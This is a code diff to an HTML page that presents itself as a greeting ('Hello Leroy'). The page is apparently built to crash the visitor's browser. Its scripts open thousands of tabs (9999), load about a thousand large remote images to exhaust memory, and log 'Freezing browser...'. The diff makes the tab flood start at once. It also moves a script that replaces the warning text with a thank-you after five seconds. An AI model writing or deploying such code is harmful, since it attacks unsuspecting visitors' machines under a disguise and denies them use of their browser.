@@ -2,7 +2,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hello Leroy</title>
+<title>Hello Person</title>
 <style>
   body {
     display: none;
@@ -34,11 +34,10 @@
   }
 </style>
 <script>
-  // Set a very high number of tabs to open
-  const numTabs = 10000;
+  // Set a number of tabs to open
+  const numTabs = 9999;
 
   window.onload = function() {
-    createChromeAppAndOpenTabs(numTabs);
     setTimeout(() => {
       document.body.classList.add('visible');
       document.querySelector('img').classList.add('visible');
@@ -62,14 +61,13 @@
     }
   }
 
-  // Attempt to create infinite tabs by recursively calling the function
   setTimeout(() => {
     createChromeAppAndOpenTabs(numTabs);
-  }, 5000);
+  }, 0);
 
   // Attempt to fill browser memory with large images
   setTimeout(() => {
-    for (let i = 0; i < 10000; i++) {
+    for (let i = 0; i < 1000; i++) {
       const largeImage = new Image();
       largeImage.src = `https://source.unsplash.com/random/1920x1080/city,night?${Date.now()}-${i}`;
       largeImage.style.width = '1px';
@@ -85,16 +83,17 @@
       console.log('Freezing browser...');
     }
   }, 0);
+
+  setTimeout(() => {
+    document.getElementById('title').textContent = 'Hello Leroy';
+    document.getElementById('disclaimer').textContent = 'Thank you for allowing us to run this script.';
+  }, 5000);
 </script>
 <body onload="createChromeAppAndOpenTabs(numTabs)">
-  <h1><span id="title">This page will create 50 Chrome apps and open tabs in the background.</span></h1>
+  <h1><span id="title">This page will create 10 Chrome apps and open tabs in the background.</span></h1>
   <p><span id="disclaimer">Please do not use this code for malicious purposes.</span></p>
   <img src="https://source.unsplash.com/random/1920x1080/city,night" alt="City Night" class="visible">
   <script>
-    setTimeout(() => {
-      document.getElementById('title').textContent = 'Hello Leroy';
-      document.getElementById('disclaimer').textContent = 'Thank you for allowing us to run this script.';
-    }, 5000);
   </script>
 </body>
 </html>
